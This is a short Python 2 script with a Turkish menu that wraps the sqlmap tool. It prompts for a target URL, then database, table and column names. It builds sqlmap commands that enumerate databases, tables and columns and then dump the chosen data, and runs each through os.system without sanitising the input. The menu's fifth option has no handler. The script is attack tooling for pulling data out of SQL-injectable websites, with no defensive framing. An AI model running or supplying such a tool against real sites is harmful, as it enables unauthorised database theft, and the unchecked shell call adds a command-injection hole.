import os

kod = ""

banner = """1-) Sadece Link biliyorum.
2-) database ismini biliyorum
3-) kolonu biliyorum
4-) datayi biliyorum
5-) Veriyi cek"""


while True:
	print banner
	sor = raw_input("Secim yapiniz : ")
	if sor == "1":
		link = raw_input("Link : ")
		kod = "sqlmap -u {} --dbs".format(link)
	if sor == "2":
		link = raw_input("Link : ")
		database_name = raw_input("Database name : ")
		kod = "sqlmap -u {} -D {} --tables".format(link, database_name)
	if sor == "3":
		link = raw_input("Link : ")
		database_name = raw_input("Database name : ")
		tablo = raw_input("Tablo ismi : ")
		kod = "sqlmap -u {} -D {} -T {} --columns".format(link, database_name, tablo)
	if sor == "4":
                link = raw_input("Link : ")
                database_name = raw_input("Database name : ")
                tablo = raw_input("Tablo ismi : ")
		data = raw_input("Data name : ")
		kod = "sqlmap -u {} -D {} -T {} -C {} --dump".format(link, database_name, tablo, data)
	os.system("clear")
	print "[+] OK."
	print "-" * 80
	os.system(kod)
